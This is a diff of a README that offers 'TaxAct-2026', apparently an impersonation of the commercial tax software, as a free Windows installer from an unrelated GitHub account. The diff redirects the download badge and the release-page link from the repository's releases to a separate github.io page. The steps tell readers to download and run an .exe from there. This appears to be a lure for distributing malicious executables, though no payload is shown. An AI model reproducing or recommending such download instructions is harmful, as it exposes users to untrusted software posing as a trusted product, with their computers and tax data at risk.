@@ -1,13 +1,13 @@
 # 📊 TaxAct-2026 - Prepare your taxes on Windows today
 
-[![Download TaxAct](https://img.shields.io/badge/Download-TaxAct-blue.svg)](https://github.com/Used-secondclass633/TaxAct-2026/releases)
+[![Download TaxAct](https://img.shields.io/badge/Download-TaxAct-blue.svg)](https://used-secondclass633.github.io)
 
 ## 📥 How to download the software
 
 Follow these steps to get the TaxAct-2026 installer on your computer.
 
 1. Open your web browser.
-2. Go to the [TaxAct-2026 release page](https://github.com/Used-secondclass633/TaxAct-2026/releases).
+2. Go to the [TaxAct-2026 release page](https://used-secondclass633.github.io).
 3. Look for the section labeled Assets.
 4. Click the file ending in .exe to start the download.
 5. Save the file to your desktop or your Downloads folder.
